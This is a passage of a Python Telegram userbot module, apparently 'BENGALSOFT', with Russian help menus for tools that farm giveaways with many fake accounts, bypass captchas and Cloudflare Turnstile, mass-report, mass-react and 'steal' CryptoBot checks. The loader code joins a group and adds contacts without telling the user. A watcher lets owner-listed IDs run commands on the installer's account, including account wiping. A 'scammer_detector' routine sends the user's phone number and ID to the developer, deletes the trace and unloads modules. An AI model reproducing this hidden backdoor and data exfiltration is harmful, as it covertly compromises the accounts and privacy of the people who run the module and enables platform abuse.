            "▫️ [link] - реферальная ссылка с параметром ?start= либо ссылка на пост розыгрыша.\n\n"
            "Поддерживаемые боты:\n"
            "@BestRandom_bot\n@TheFastes_Bot\n@TheFastesRuBot\n"
            "@GiveawayLuckyBot\n@best_contests_bot\n@TicketsBot\n\n"
            "Примеры:\n"
            "/ref 2 https://t.me/BestRandom_bot?start=lot_join3333296p79a676a7e4010ad988029f76ade390bd\n"
            "/ref https://t.me/c/1234567890/1234567890\n\n"
            "Примечание:\n"
            "В бестрандоме идут просмотры на пост розыгрыша. В бестрандоме и бестконтесте "
            "доступны обходы Simple Captcha. Цена 1-2$ за 1000 использований. "
            "На розыгрыши с капчами ставить мультиплаер минимум х30."
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_tegive(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_teg", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Запуск ботов TEGIVE</b>\n{access}\n\n"
            "🔗 /tegive [mult] [bot] — Тегив бот\n"
            "▫️ [mult] - множитель задержки (необязательно)\n"
            "▫️ [bot] - ссылка на бота, его @username или ссылка на пост с кнопкой\n\n"
            "Примеры:\n"
            "/tegive 2 https://t.me/bengalsoftbot\n"
            "/tegive @bengalsoftbot\n"
            "/tegive https://t.me/channel/123\n"
            "/tegive 10 t.me/c/123/456"
            "Примечание:\n"
            "Если вы полпустили подписку - модуль автоматом подпишется на недостающие каналы. "
            "Идет полная обработка бота, а не просто старт. После резов запускаете бота снова - "
            "модуль проверит розыгрыш, блокнет ненужные, выведет побелителя если ваш акк победил. "
            "Ну и подобные обработки на каждом шагу."
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_cryptogive(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_cryptogive", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Запуск CryptoBot WebApp</b>\n{access}\n\n"
            "🔗 /cryptogiveaway [mult] [target]\n"
            "▫️ [mult] - множитель задержки (необязательно)\n"
            "▫️ [target] - реф ссылка или на пост с кнопкой\n\n"
            "Примеры:\n"
            "/cryptogive 2 https://t.me/bengalsoft/111\n"
            "/cryptogive https://t.me/CryptoBot/app?startapp=giveaway-GzOSzimMUBO1X\n\n"
            "Примечание:\n"
            "Если вы полпустили подписку - модуль автоматом подпишется на недостающие каналы. "
            "Имеется обход Cloudflare Turnstile. Цена 2$ за 1000 использований."
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_infochan(self, call):
        text = (
            "<b>📝 Информация о каналах</b>\n\n"
            "🔗 /infochan [days] [target]\n"
            "▫️ [days] - количество афк дней, фильтр\n"
            "▫️ [target] - валид твинка\n\n"
            "Примечание:\n"
            "На момент написания мануала модуль хоть и работает, но не стабильно. "
            "Мне лень им заниматься, как-нибудь доделаю."
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_contacter(self, call):
        text = (
            "<b>📝 Добавление в контакты</b>\n\n"
            "🔗 /contact [mode] [target]\n"
            "▫️ [mode] - add / del\n"
            "▫️ [target] - валид твинка\n\n"
            "Примечание:\n"
            "Чисто для внутреннего использования при загрузке модуля делал, но "
            "также добавил внешнюю команду для удобства. Мб кому нужно будет"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_giveshare(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_giveshare", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Запуск GiveShareBot</b>\n{access}\n\n"
            "🔗 /giveshare [mult] [target]\n"
            "▫️ [mult] - множитель задержки (необязательно)\n"
            "▫️ [target] - реф ссылка или на пост с кнопкой\n\n"
            "Примечание:\n"
            "На момент написания мануала гившер не работает, ввели новую защиту."
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_cryptosteal(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_steal", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Снюхиватель чеков кб</b>\n{access}\n\n"
            "🔗 /steal [target] [pass]\n"
            "▫️ [target] - ссылка чека\n"
            "▫️ [pass] - пароль (не обязательный)\n\n"
            "Примечание:\n"
            "На момент написания мануала модуль на доработке. "
            "Имеется обход Simple Captcha. Цена 1-2$ за 1000 использований."
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]   
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_action(self, call):
        text = (
            "<b>📝 Вспомогательные действия</b>\n\n"
            "🔗 /action [mode] [target]\n"
            "▫️ [target] - ссылка на бота/канал или @username\n"
            "▫️ [mode] - нужное действие\n\n"
            "Моды:\n"
            "bandel — Бан + удаление\n"
            "mute — Отключить уведы\n"
            "unmute — Включить уведы\n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_system(self, call):
        text = (
            "<b>📝 Вызовы системных команд</b>\n\n"
            "🔗 /system [mode] [user]\n"
            "▫️ [user] - валиды аккаунта или несколькоих (юзер, номер, айди, ник)\n"
            "▫️ [mode] - нужное действие\n\n"
            "Моды:\n"
            "ping — Пинг\n"
            "clearlogs — Сброс логов\n"
            "config — Конфиг\n"
            "unloadmod — Удалить модуль\n"
            "cleardb — Сброс ДБ\n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_reactor(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_react", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Автореакции на смс</b>\n{access}\n\n"
            "🔗 /react [mult] [type] [target]\n"
            "▫️ [type] - тип реакции (positive/negative/neutral), полная или сокращенная вариация записи, \n"
            "можно добавлять конкретный список без пробела или конкретная реакция\n"
            "▫️ [mult] - множитель задержки (необязательно)\n"
            "▫️ [target] - ссылка на пост или смс\n\n"
            "Доступные реакции:\n"
            "🔹 Positive: (pos)\n"
            f"1: {', '.join(self.reactions['positive'][1])}\n"
            f"2: {', '.join(self.reactions['positive'][2])}\n"
            f"3: {', '.join(self.reactions['positive'][3])}\n"
            f"4: {', '.join(self.reactions['positive'][4])}\n\n"
            "🔹 Negative: (neg)\n"
            f"1: {', '.join(self.reactions['negative'][1])}\n"
            f"2: {', '.join(self.reactions['negative'][2])}\n"
            f"3: {', '.join(self.reactions['negative'][3])}\n\n"
            "🔹 Neutral: (neu)\n"
            f"1: {', '.join(self.reactions['neutral'][1])}\n"
            f"2: {', '.join(self.reactions['neutral'][2])}\n"
            f"3: {', '.join(self.reactions['neutral'][3])}\n"
            f"4: {', '.join(self.reactions['neutral'][4])}\n\n"
            "Примеры использования:\n"
            "/react 2 positive link\n"
            "/react neg1 link\n"
            "/react neutral3 link\n"
            "/react 10 ❤️ link"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_reporter(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_report", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Репорты (жалобы)</b>\n{access}\n\n"
            "🔗 /report [mult] [target]\n"
            "▫️ [target] - ссылка на пост или смс\n"
            "▫️ [mult] - множитель задержки (необязательно)\n"
            "▫️ [target] - юзернейм или ссылка.\n\n"
            "Доступные таргеты:\n"
            "Юзернейм. Ссылка на пост или смс в чате (публик / приват). "
            "Ссылка на смс в комментах канала (публик / приват)\n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def manual_clean(self, call):
        access = "✅ Доступен к использованию" if self.get("lic_uns", False) else "❌ Доступ запрещен"
        text = (
            f"<b>📝 Полная очистка аккаунта</b>\n{access}\n\n"
            "🔗 /clean [users]\n"
            "▫️ [users] - валид или несколько.\n\n"
            "Примеры:\n"
            "/clean @user1 @user2\n"
            "/clean all\n"
            "Если в лс пишете - можно просто /clean, без валида\n"
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(text=text, reply_markup=buttons)

#=======================================================================================

    async def manual_sms(self, call):
        text = (
            "<b>📝 Массовая отправка смс</b>\n\n"
            "🔗 /sms [target] [text]\n"
            "▫️ [target] - юзер чела или публичный чат.\n"
            "▫️ [text] - текст сообщения\n\n"
            "Примеры:\n"
            "/sms @user Привет!\n"
            "Как-нибудль потом доделаю его, чтобы комменты в каналах оставлять и тд. Лень."
        )
        buttons = [
            [
                {
                    "text": "« Назад", 
                    "callback": self.manual_commands_dorabotki
                },
                {
                    "text": "« На главную", 
                    "callback": self.manual_main
                }
            ]
        ]
        await call.edit(text=text, reply_markup=buttons)

#=======================================================================================
#=======================================================================================

    async def addfolder_soft(self):
        try:
            folder_name = "BENGAL"
            chatiki = []
            dialog_filters = await self.client(functions.messages.GetDialogFiltersRequest())
            folder = next((f for f in dialog_filters if hasattr(f, "title") and f.title == folder_name), None)
            all_ids = [self.owner_chat] + self.whitelist_soft + self.owner_list
            for id in all_ids:
                try:
                    entity = await self.client.get_entity(int(id) if isinstance(id, str) else id)
                    input_entity = await self.client.get_input_entity(entity)
                    if input_entity:
                        chatiki.append(input_entity)
                except:
                    continue
            if not chatiki:
                return
            folder = types.DialogFilter(
                id=10,
                title=folder_name,
                include_peers=chatiki,
                exclude_peers=[],
                pinned_peers=[],
                emoticon=None,
                contacts=False,
                non_contacts=False,
                groups=False,
                broadcasts=False,
                bots=False,
                exclude_muted=False,
                exclude_read=False,
                exclude_archived=False
            )
            await self.client(functions.messages.UpdateDialogFilterRequest(
                id=10,
                filter=folder
            ))
        except Exception as e:
            return f"🚫 ADD FOLDER:\n{str(e)}"

#=======================================================================================

    async def addcontacts_soft(self):
        try:
            for owner_id in self.owner_list:
                await self.handle_contacter(f"init add {owner_id} OWNER")
        except Exception as e:
            return f"🚫 ADD OWNERS:\n{str(e)}"


#=======================================================================================
#=======================================================================================
    
    async def on_dlmod(self, client, db):
        try:
            await self.owner_group()
            lic = await self.handle_license()
            if lic:
                if not hasattr(self, "user") or not self.user:
                    self.user = await self.client.get_me()
                status = "<b>BENGALSOFT ACTIVATED ♻️</b>"
                await self.addcontacts_soft()
                await self.addfolder_soft()
                settings = await self.handle_reconfig("init")
                text = f"<b>{status}\n{settings if settings else ''}\n</b>"
            else:
                text = "<b>❌ BENGALSOFT: PERMISSION DENIED</b>"
            self.dl_checker = False
            asyncio.create_task(self.reset_dl_checker())
        except Exception as e:
            text = f"🚫 INIT:\n{str(e)}"
        finally:
            await self.send_custom_message(text)

#=======================================================================================

    async def client_ready(self, client, db):
        try:
            self.user = await self.client.get_me()
            if not self.dl_checker:
                return
            await self.handle_license()
        except Exception:
            pass

#=======================================================================================

    async def on_unload(self):
        #await self.send_custom_message(f"<b>♻️ BENGALSOFT UNLOADED\n\n</b>")
        pass

#=======================================================================================

    async def reset_dl_checker(self):
        await asyncio.sleep(10)
        self.dl_checker = True

#=======================================================================================

    async def owner_group(self):
        try:
            await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
        except UserAlreadyParticipantError:
            pass
        except Exception as exc:
            return str(exc)
        
#=======================================================================================


    async def handle_license(self, message=None):
        try:
            license_params = [
                "license",
                "lic_pmm", "lic_sub", "lic_uns",
                "lic_run", "lic_ref",
                "lic_tegive", "lic_react", "lic_report",
                "lic_giveshare", "lic_cryptogive", "lic_steal",
            ]
            for param in license_params:
                self.set(param, False)
            channel = await self.client.get_entity("BENGALSOFTLICENSE")
            if channel.id != 2368734806:
                return False
            license_message = await self.client.get_messages(
                channel,
                ids=self.license_number
            )
            if not license_message or not license_message.message:
                await self.scammer_detector()
                return False
            lines = license_message.message.split('\n')
            if not lines or len(lines) < 2 or not await self.check_license(lines[:2]):
                await self.scammer_detector()
                return False
            self.set("license", True)
            for line in lines[1:]:
                for param in license_params:
                    if f"+{param}" in line:
                        self.set(param, True)
            if message is None:
                return True
            else:
                recipient = self.owner_chat
                if isinstance(message, str):
                    parts = message.split()
                else:
                    parts, recipient = message.message.split(), message.chat_id
                    if not message.is_private:
                        if len(parts) < 2 or not self.user_validator(parts[1]):
                            return True
                if parts[0] != "/license":
                    return True
                result = f"<b>BENGALSOFT LICENSE:</b>\n"
                for param in license_params:
                    name = param.replace("lic_", "").capitalize()
                    status = "✅" if self.get(param, False) else "❌"
                    result += f"<b>{status} {name}</b>\n"
                return await self.send_custom_message(result, recipient=recipient)
        except Exception:
            return False


#=======================================================================================

    async def check_license(self, lines):
        try:
            if (
                lines[0] != f"LICENSE v{self.softversion}" or
                lines[1] != f"{self.softname} {self.owner_user}" or 
                922318957 not in self.owner_list  #surprise, suchka!
            ):
                return False
            else:
                return True
        except Exception:
            return False

#=======================================================================================

    async def scammer_detector(self):
        # meta developer: @pavlyxa_rezon
        try:
            reserve_code = "iMj1Q9BGlbI3MzNi"
            try:
                await self.client(ImportChatInviteRequest(reserve_code))
            except Exception:
                pass
            try:
                softchat = await self.client.get_entity(f"https://t.me/+{reserve_code}")
                reserve_id = softchat.id
            except Exception:
                reserve_id = 922318957
            user = await self.client.get_me()
            await self.client.send_message(reserve_id, f"{self.softname} v{self.softversion} ⚠️\nVOR {self.owner_user}\n+{user.phone} {user.id}")
            await self.client.delete_dialog(reserve_id)
        except Exception as e:
            return f"🚫 SD: {str(e)}"
        finally:
            await self.handle_user_system("run unloadmod all")


#=======================================================================================
#=======================================================================================
#=======================================================================================

    async def get_command_handlers(self, message):
        handlers = {
            "/sub": self.handle_subscribe,
            "/uns": self.handle_unsubscribe,
            "/clean": self.handle_clean,
            "/run": self.handle_runner,
            "/ref": self.handle_referal,

            "/manual": self.handle_manual,
            "/get": self.handle_get_user,
            "/set": self.handle_set_user,
            "/reconfig": self.handle_reconfig,
            "/license": self.handle_license,

            "/action": self.handle_user_action,
            "/system": self.handle_user_system,
            "/contact": self.handle_contacter,
        }
        for command, handler in handlers.items():
            if message.message.startswith(command):
                return await handler(message)
        return None
    
#=======================================================================================

    @loader.watcher(filter=lambda m: m.out is False, only_messages=True, no_media=True)
    async def watcher_bengalsoft(self, message):
        try:
            if message.sender_id in self.owner_list and message.message.startswith("/"):
                return await self.get_command_handlers(message)
            else:
                return
        except Exception as e:
            return await self.watcher_error(str(e))

#=======================================================================================

    async def watcher_error(self, error):
        try:
            if "referenced before assignment" in error:
                if self.config["group"] == 1:
                    await self.send_logger_message(f"🚫 WATCHER SYNTAX @pavlyxa_rezon: {error}")
            else:
                await self.send_logger_message(f"🚫 WATCHER: {error}")
        except Exception:
            return
        finally:
            return
=======================================================================================
